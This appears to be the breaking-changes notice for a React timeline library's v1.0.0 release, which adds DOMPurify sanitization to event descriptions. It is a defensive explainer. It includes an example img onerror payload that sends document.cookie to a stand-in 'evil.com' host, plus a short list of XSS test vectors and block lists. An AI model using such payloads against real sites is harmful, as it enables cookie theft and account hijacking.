# Breaking Changes - V1.0.0

**Version**: v1.0.0
**Release Date**: TBD (Expected: 2025-11-23)
**Migration Guide**: [MIGRATION.md](./MIGRATION.md)

---

## Overview

This document lists all breaking changes introduced in React Simile Timeline v1.0.0.

**Summary**: Only **1 breaking change** in v1.0.0 - HTML sanitization for security.

**Impact**: Low-Medium (affects only timelines with HTML in event descriptions)

---

## Breaking Change #1: HTML Sanitization

### Severity: 🔴 CRITICAL (Security)

**Category**: Security Enhancement
**Component**: EventBubble
**Affected APIs**: `TimelineEvent.description` field

### What Changed

Event descriptions containing HTML are now **automatically sanitized** using [DOMPurify](https://github.com/cure53/DOMPurify) before rendering.

### Why This Change?

**Security Vulnerability**: Previous versions rendered HTML without sanitization, allowing potential XSS (Cross-Site Scripting) attacks if event data came from untrusted sources.

**Example Attack Vector** (Beta - UNSAFE):
```tsx
// Malicious event data
const event = {
  title: 'Click Me',
  description: '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">'
};
// Beta: Would execute malicious code
// V1.0: Image stripped, code never executes ✓
```

### Before (v0.1.0-beta.x)

```tsx
// Beta: Raw HTML rendered directly (DANGEROUS!)
const event = {
  title: 'Event',
  description: `
    <p>Safe content</p>
    <script>alert('XSS')</script>
    <img src=x onerror="maliciousCode()">
  `
};

// All HTML rendered including dangerous scripts
```

### After (v1.0.0)

```tsx
// V1.0: HTML sanitized automatically (SAFE!)
const event = {
  title: 'Event',
  description: `
    <p>Safe content</p>
    <script>alert('XSS')</script>
    <img src=x onerror="maliciousCode()">
  `
};

// Rendered as:
// <p>Safe content</p>
// <img src=x>
// Scripts and event handlers removed ✓
```

---

## Allowed HTML Tags

### Text Formatting (Safe)

```html
<b>Bold</b>
<i>Italic</i>
<em>Emphasis</em>
<strong>Strong</strong>
<u>Underline</u>
<s>Strikethrough</s>
<sup>Superscript</sup>
<sub>Subscript</sub>
<mark>Highlighted</mark>
```

### Links (Safe)

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer">
  Click Here
</a>

<!-- Dangerous URLs blocked -->
<a href="javascript:alert(1)">Blocked</a> ❌
<a href="data:text/html,<script>alert(1)</script>">Blocked</a> ❌
```

### Structure (Safe)

```html
<p>Paragraph</p>
<br>
<div>Division</div>
<span>Span</span>
<hr>
```

### Lists (Safe)

```html
<ul>
  <li>Unordered item</li>
</ul>

<ol>
  <li>Ordered item</li>
</ol>
```

### Tables (Safe)

```html
<table>
  <thead>
    <tr>
      <th>Header</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Data</td>
    </tr>
  </tbody>
</table>
```

### Headers (Safe)

```html
<h1>Heading 1</h1>
<h2>Heading 2</h2>
<h3>Heading 3</h3>
<h4>Heading 4</h4>
<h5>Heading 5</h5>
<h6>Heading 6</h6>
```

### Code (Safe)

```html
<code>inline code</code>
<pre>preformatted text</pre>
<blockquote>Quote</blockquote>
```

---

## Blocked Content

### Scripts and Dangerous Tags (Blocked)

```html
<!-- All BLOCKED and removed -->
<script>alert(1)</script> ❌
<iframe src="..."></iframe> ❌
<object data="..."></object> ❌
<embed src="..."> ❌
<applet></applet> ❌
<link rel="stylesheet"> ❌
<style>CSS</style> ❌
```

### Event Handlers (Blocked)

```html
<!-- All event attributes BLOCKED -->
<img onerror="alert(1)"> ❌
<body onload="alert(1)"> ❌
<div onclick="alert(1)"> ❌
<input onfocus="alert(1)"> ❌
<a onmouseover="alert(1)"> ❌

<!-- 70+ event handlers blocked -->
```

### Dangerous URLs (Blocked)

```html
<!-- Dangerous protocols BLOCKED -->
<a href="javascript:alert(1)">Click</a> ❌
<a href="data:text/html,<script>...">Click</a> ❌
<a href="vbscript:...">Click</a> ❌

<!-- Safe protocols ALLOWED -->
<a href="https://example.com">Click</a> ✓
<a href="http://example.com">Click</a> ✓
<a href="mailto:user@example.com">Email</a> ✓
<a href="tel:+1234567890">Call</a> ✓
<a href="#section">Anchor</a> ✓
```

### Forms (Blocked for Security)

```html
<!-- Form elements BLOCKED -->
<form action="..."></form> ❌
<input type="text"> ❌
<button>Click</button> ❌
<textarea></textarea> ❌
<select><option>...</option></select> ❌
```

### Unsafe Attributes (Blocked)

```html
<!-- Most attributes BLOCKED -->
<div style="color: red"> ❌ (style attribute)
<div class="my-class"> ✓ (class allowed)
<div id="my-id"> ✓ (id allowed)
<a href="..." target="_blank"> ✓ (safe attributes)
```

---

## Migration Impact

### Impact Rating by Use Case

| Use Case | Impact | Action Required |
|----------|--------|-----------------|
| **Plain text descriptions** | ✅ None | No changes needed |
| **Basic HTML (p, b, i, a)** | ✅ None | No changes needed |
| **Complex HTML (tables, lists)** | ✅ None | No changes needed |
| **Inline styles** | 🟡 Low | Use CSS classes instead |
| **Scripts in descriptions** | 🔴 High | Use event callbacks |
| **Forms in descriptions** | 🔴 High | Use custom components |
| **Event handlers (onclick, etc)** | 🔴 High | Use React event props |

### Low Impact (90% of Users)

If you use **plain text** or **basic HTML**, no changes needed:

```tsx
// These work without changes ✓
const events = [
  {
    title: 'Event 1',
    description: 'Plain text description'
  },
  {
    title: 'Event 2',
    description: '<p>Paragraph with <b>bold</b> and <i>italic</i></p>'
  },
  {
    title: 'Event 3',
    description: '<a href="https://example.com">Link</a>'
  }
];
```

### Medium Impact (8% of Users)

If you use **inline styles**, migrate to CSS classes:

```tsx
// Before (blocked):
description: '<div style="color: red; font-size: 16px;">Styled text</div>'

// After (works):
description: '<div class="event-highlight">Styled text</div>'

// Add to your CSS:
.event-highlight {
  color: red;
  font-size: 16px;
}
```

### High Impact (2% of Users)

If you use **scripts** or **forms**, use React callbacks:

```tsx
// Before (blocked):
description: '<button onclick="alert(\'Clicked\')">Click Me</button>'

// After (works):
<Timeline
  data={events}
  onEventClick={(event) => {
    alert('Clicked: ' + event.title);
  }}
/>
```

---

## Migration Examples

### Example 1: Simple HTML (No Changes)

```tsx
// ✅ Works without changes
const event = {
  title: 'World Cup 2006',
  description: `
    <p><b>FIFA World Cup 2006</b> was held in Germany.</p>
    <p>Final: <em>Italy</em> defeated <em>France</em> on penalties.</p>
    <a href="https://fifa.com">More info</a>
  `
};
```

### Example 2: Replace Inline Styles

```tsx
// ❌ Before (blocked):
const event = {
  description: '<p style="color: red; background: yellow;">Warning!</p>'
};

// ✅ After (use CSS):
const event = {
  description: '<p class="warning">Warning!</p>'
};

// CSS:
.warning {
  color: red;
  background: yellow;
}
```

### Example 3: Replace Scripts with Callbacks

```tsx
// ❌ Before (blocked):
const event = {
  description: `
    <p>Event details</p>
    <button onclick="window.open('https://tickets.com')">Buy Tickets</button>
  `
};

// ✅ After (use event callbacks):
const event = {
  title: 'Concert',
  description: '<p>Event details</p>',
  link: 'https://tickets.com' // Use link field
};

<Timeline
  data={events}
  onEventClick={(event) => {
    if (event.link) {
      window.open(event.link, '_blank');
    }
  }}
/>
```

### Example 4: Replace Forms with Custom Components

```tsx
// ❌ Before (blocked):
const event = {
  description: `
    <form>
      <input type="text" placeholder="Name">
      <button>Submit</button>
    </form>
  `
};

// ✅ After (custom event bubble):
import { EventBubble } from 'react-simile-timeline';

const CustomBubble = ({ event, onClose }) => (
  <div>
    <h3>{event.title}</h3>
    <p>{event.description}</p>
    <form onSubmit={handleSubmit}>
      <input type="text" placeholder="Name" />
      <button type="submit">Submit</button>
    </form>
  </div>
);

// Use custom bubble
<Timeline
  data={events}
  customBubble={CustomBubble}
/>
```

---

## Testing Your Migration

### 1. Automated Tests

```tsx
import { render } from '@testing-library/react';
import { EventBubble } from 'react-simile-timeline';

describe('HTML Sanitization', () => {
  it('should allow safe HTML', () => {
    const event = {
      title: 'Test',
      description: '<p><b>Bold</b> and <i>italic</i></p>'
    };

    const { container } = render(
      <EventBubble event={event} onClose={() => {}} />
    );

    expect(container.innerHTML).toContain('<b>Bold</b>');
    expect(container.innerHTML).toContain('<i>italic</i>');
  });

  it('should block scripts', () => {
    const event = {
      title: 'Test',
      description: '<script>alert("XSS")</script><p>Safe</p>'
    };

    const { container } = render(
      <EventBubble event={event} onClose={() => {}} />
    );

    expect(container.innerHTML).not.toContain('<script>');
    expect(container.innerHTML).toContain('<p>Safe</p>');
  });
});
```

### 2. Visual Testing

1. Load your timeline
2. Click on events with HTML descriptions
3. Verify content displays correctly
4. Check browser console for errors
5. Inspect rendered HTML in DevTools

### 3. Security Testing

```bash
# Test with XSS payloads
const xssVectors = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '<a href="javascript:alert(1)">click</a>'
];

# Verify all vectors are blocked
xssVectors.forEach(vector => {
  const event = { title: 'Test', description: vector };
  // Should not execute any alerts
});
```

---

## Rollback Instructions

If you encounter critical issues:

### 1. Temporary Rollback

```bash
# Rollback to latest beta
npm install react-simile-timeline@0.1.0-beta.1

# Or use beta tag
npm install react-simile-timeline@beta
```

### 2. Report Issue

[Create a GitHub issue](https://github.com/thbst16/react-simile-timeline/issues/new) with:
- Event data that breaks
- Expected vs actual behavior
- Browser/environment details
- Error messages/screenshots

### 3. Temporary Workaround

While waiting for fix:

```tsx
// Option A: Use plain text
description: 'Text without HTML'

// Option B: Use custom bubble component
customBubble={YourCustomComponent}
```

---

## FAQ

### Q: Why was this change necessary?

**A**: Security. Without sanitization, malicious event data could execute arbitrary JavaScript, steal user data, or compromise your application.

### Q: Can I disable sanitization?

**A**: No, for security reasons. However, you can use custom bubble components for complete control over rendering.

### Q: What if I need to render custom HTML?

**A**: Use a custom EventBubble component:
```tsx
<Timeline customBubble={YourComponent} />
```

### Q: Will my existing data still work?

**A**: Yes, for 90% of use cases. Safe HTML tags continue to work. Only dangerous content (scripts, event handlers) is blocked.

### Q: How do I style event descriptions now?

**A**: Use CSS classes instead of inline styles:
```tsx
description: '<p class="my-style">Text</p>'
```

### Q: Can I use iframes for videos?

**A**: No, iframes are blocked. Use the `media` field instead:
```tsx
const event = {
  title: 'Video',
  media: {
    type: 'video',
    url: 'https://youtube.com/embed/...'
  }
};
```

---

## Version History

| Version | Change | Date |
|---------|--------|------|
| **v1.0.0** | HTML sanitization added (breaking) | 2025-11-23 |
| v0.1.0-beta.3 | No breaking changes | 2025-11-15 |
| v0.1.0-beta.1 | Initial beta release | 2025-11-14 |

---

## Future Breaking Changes

**None planned for v1.x**

All v1.x releases will be backward compatible. Breaking changes are reserved for v2.0 (expected Q4 2026).

Planned for v2.0:
- Plugin architecture
- API improvements based on v1.x feedback
- Deprecated feature removal (if any)

See [ROADMAP.md](./ROADMAP.md) for details.

---

## Additional Resources

- **Migration Guide**: [MIGRATION.md](./MIGRATION.md)
- **Security Documentation**: [SECURITY.md](./SECURITY.md)
- **API Reference**: [API.md](../project/API.md)
- **Theme Guide**: [THEMING.md](./THEMING.md)
- **DOMPurify Docs**: https://github.com/cure53/DOMPurify

---

## Support

Need help with migration?

- 💬 [GitHub Discussions](https://github.com/thbst16/react-simile-timeline/discussions)
- 🐛 [Report Issues](https://github.com/thbst16/react-simile-timeline/issues)
- 📧 Contact maintainers for commercial support

---

**Last Updated**: 2025-11-16
**Version**: 1.0
**Status**: Final
